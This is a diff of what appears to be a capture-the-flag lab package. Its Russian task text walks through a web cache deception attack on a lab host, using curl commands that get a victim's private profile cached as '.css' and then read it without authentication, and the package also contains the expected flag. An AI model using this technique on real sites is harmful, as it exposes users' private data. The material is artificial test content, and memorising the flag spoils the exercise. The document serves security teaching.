@@ -7,10 +7,13 @@
     "contains": "nto{c4ch3_d3c3pt10n_l34ks_y0ur_pr0f1l3}"
   },
   "fs": [
-    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: Web Cache Deception\n\n`shop.local` за CDN. Приватный профиль `/profile/me` кэшировать нельзя, но\nесли попросить его как «статику» (`/profile/me.css`), кэш сохранит ответ —\nвместе с секретным полем профиля.\n\n1. Приватный профиль (не кэшируется):\n   curl -s -i 'http://shop.local/profile/me' -H 'Cookie: session=victim123'\n   (Cache-Control: private, no-store)\n2. Просим тот же профиль как CSS — путь сбивает кэш с толку:\n   curl -s -i 'http://shop.local/profile/me.css' -H 'Cookie: session=victim123'\n   (X-Cache: MISS, Cache-Control: public — ответ закэширован)\n3. Теперь читаем кэш БЕЗ авторизации — отдаётся профиль жертвы с секретом:\n   curl -s 'http://shop.local/profile/me.css'\n4. Флаг — последняя строка. Запиши в `found.txt` и набери `check`.\n"
+      "text": "# Практика: Web Cache Deception\n\n`shop.local` за CDN. Приватный профиль `/profile/me` кэшировать нельзя, но\nесли попросить его как «статику» (`/profile/me.css`), кэш сохранит ответ —\nвместе с секретным полем профиля.\n\n1. Приватный профиль (не кэшируется):\n   curl -s -i 'http://shop.local/profile/me' -H 'Cookie: session=victim123'\n   (Cache-Control: private, no-store)\n2. Просим тот же профиль как CSS — путь сбивает кэш с толку:\n   curl -s -i 'http://shop.local/profile/me.css' -H 'Cookie: session=victim123'\n   (X-Cache: MISS, Cache-Control: public — ответ закэширован)\n3. Теперь читаем кэш БЕЗ авторизации — отдаётся профиль жертвы с секретом:\n   curl -s 'http://shop.local/profile/me.css'\n4. Флаг — последняя строка. Запиши в `found.txt` и набери `check`.\n\n## Повторение (`web-cache-poisoning`)\n\nCache deception — родственник cache poisoning: там портили запись кэша, здесь обманом заставляют закэшировать приватное; разбор был в `web-cache-poisoning`. Освежи: сначала сравни, как ведёт себя приватный путь:\n\n    curl -s -i 'http://shop.local/profile/me' -H 'Cookie: session=victim123' | grep -i cache-control\n\n`Cache-Control: private, no-store` на честном пути — эталон. Ниже просишь тот же профиль как `me.css`.\n"
     }
   ],
   "tools": {
